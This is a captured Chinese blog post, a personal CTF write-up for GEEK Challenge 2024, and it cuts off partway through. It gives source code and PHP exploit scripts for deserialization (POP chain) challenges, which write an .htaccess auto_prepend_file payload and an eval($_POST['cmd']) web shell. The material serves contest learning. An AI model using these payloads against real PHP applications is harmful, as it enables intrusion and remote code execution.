<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>GEEK Challenge2024 Web+Misc+Crypto个人题解WP | hatchet的个人博客</title><meta name="author" content="hatchet"><meta name="copyright" content="hatchet"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="我是极客大挑战2024第二名队里的web手关注我们队的逆向手谢谢喵 Error 的小破站 Web100%的⚪js代码搜atob能直接看到base64编码的flag ezpop题目源码：  &lt;?phpClass SYC&#123;    public $starven;    public function __call($name, $arguments)&#123;        if(p"><meta property="og:type" content="article"><meta property="og:title" content="GEEK Challenge2024 Web+Misc+Crypto个人题解WP"><meta property="og:url" content="https://blog.hatchet.top/posts/c264f0a9.html"><meta property="og:site_name" content="hatchet的个人博客"><meta property="og:description" content="我是极客大挑战2024第二名队里的web手关注我们队的逆向手谢谢喵 Error 的小破站 Web100%的⚪js代码搜atob能直接看到base64编码的flag ezpop题目源码：  &lt;?phpClass SYC&#123;    public $starven;    public function __call($name, $arguments)&#123;        if(p"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://blog.hatchet.top/img/favicon.png"><meta property="article:published_time" content="2024-11-15T09:55:59.000Z"><meta property="article:modified_time" content="2024-11-25T09:43:35.000Z"><meta property="article:author" content="hatchet"><meta property="article:tag" content="WP"><meta property="article:tag" content="web"><meta property="article:tag" content="misc"><meta property="article:tag" content="crypto"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.hatchet.top/img/favicon.png"><link rel="shortcut icon" href="/img/site-icons/32.png"><link rel="canonical" href="https://blog.hatchet.top/posts/c264f0a9.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="rszg-kE237B0-dGThaehXBebGboOc0Q82fRXVYeUU1k"><meta name="baidu-site-verification" content="codeva-2HmCKaqSou"><link rel="manifest" href="/manifest.json"><meta name="msapplication-TileColor" content="#3b70fc"><link rel="apple-touch-icon" sizes="180x180" href="/img/site-icons/128.png"><link rel="icon" type="image/png" sizes="32x32" href="/img/site-icons/32.png"><link rel="icon" type="image/png" sizes="16x16" href="/img/site-icons/16.png"><link rel="mask-icon" href="/img/site-icons/128.png" color="#5bbad5"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?7283dfdb9e4a206dda9d425dcf6eceae";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"GEEK Challenge2024 Web+Misc+Crypto个人题解WP",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-11-25 17:43:35"}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="hatchet的个人博客" type="application/atom+xml"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://picsum.photos/id/859/1919/1919)"><nav id="nav"><span id="blog-info"><a href="/" title="hatchet的个人博客"><span class="site-name">hatchet的个人博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i> <span>关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">GEEK Challenge2024 Web+Misc+Crypto个人题解WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-15T09:55:59.000Z" title="发表于 2024-11-15 17:55:59">2024-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-25T09:43:35.000Z" title="更新于 2024-11-25 17:43:35">2024-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">11k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>59分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="GEEK Challenge2024 Web+Misc+Crypto个人题解WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="/img/WP/geek2024/%E6%88%90%E7%BB%A9.png"><br>我是极客大挑战2024第二名队里的web手<br>关注我们队的逆向手谢谢喵 <a target="_blank" rel="noopener" href="http://www.czyerror.top/">Error 的小破站</a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="100-的⚪"><a href="#100-的⚪" class="headerlink" title="100%的⚪"></a>100%的⚪</h2><p>js代码搜atob能直接看到base64编码的flag<br><img src="/img/WP/geek2024/sign.png"></p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目确实出到不会的考点了，反复调用的问题开始无法解决，导致一直空着，解题思路是在做第二个pop链的GC回收时看到的绕过反复调用<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/Jayjay___/article/details/130647484?spm=1001.2014.3001.5502">https://blog.csdn.net/Jayjay___/article/details/130647484?spm=1001.2014.3001.5502</a><br><img src="/img/WP/geek2024/%E7%BB%95%E8%BF%87%E5%8F%8D%E5%A4%8D%E8%B0%83%E7%94%A8.png"><br>绕过方法为多实例化一个对象<br>一般的pop链连接不讲了，最后需要绕过死亡exit命令。<br>屏蔽了二次编码和一些直接写马的可能，好在我们不用RCE，可以不用尖括号<br>写个.htaccess文件，利用 <code>php_value auto_prepend_file &quot;/flag&quot;</code> 直接回显出flag<br>exp如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$S</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$l1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$l2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$G1</span>=<span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$G2</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$l1</span>-&gt;J1rry=<span class="string">&quot;data://text/plain,Welcome GeekChallenge 2024&quot;</span>;</span><br><span class="line"><span class="variable">$l1</span>-&gt;meimeng = <span class="variable">$G1</span>;</span><br><span class="line"><span class="variable">$G1</span>-&gt;GSBP = <span class="variable">$l2</span>;</span><br><span class="line"><span class="variable">$l2</span>-&gt;meimeng = <span class="variable">$G2</span>;</span><br><span class="line"><span class="variable">$G2</span>-&gt;GSBP = <span class="variable">$S</span>;</span><br><span class="line"><span class="comment">#&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span></span><br><span class="line"><span class="comment"># string.toupper</span></span><br><span class="line"><span class="comment"># string.tolower</span></span><br><span class="line"><span class="comment"># string.strip_tags</span></span><br><span class="line"><span class="variable">$S</span>-&gt;starven=<span class="string">&#x27;php://filter/string.strip_tags/?&gt;php_value auto_prepend_file &quot;/flag&quot;&lt;?/resource=.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$l1</span>);</span><br><span class="line"><span class="variable">$exp</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:7:&quot;meimeng&quot;&#x27;</span>, <span class="string">&#x27;S:7:&quot;m\65imeng&quot;&#x27;</span>, <span class="variable">$exp</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure><h2 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Syclover&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Syclover</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Syclover</span>));</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;怎么不给我呢，是不喜欢吗？&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>throw new Exception是明显的GC回收标志。除了这个就是锻炼serialize基本功的时间了<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/Jayjay___/article/details/130647484">https://blog.csdn.net/Jayjay___/article/details/130647484</a><br><img src="/img/WP/geek2024/GC%E5%9B%9E%E6%94%B6.png"><br>GC回收的利用方法：<br>假设先前你要序列化a对象，改为serialize($a, null)，并把最后的i:1对象破坏，变成i:0, 这样就可以绕过throw new Exception。<br>因为PHP7.3后对private和protect不敏感，所以直接用public就可以<br>exp:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>=<span class="string">&#x27;file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[\&#x27;cmd\&#x27;]);?&gt;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>=<span 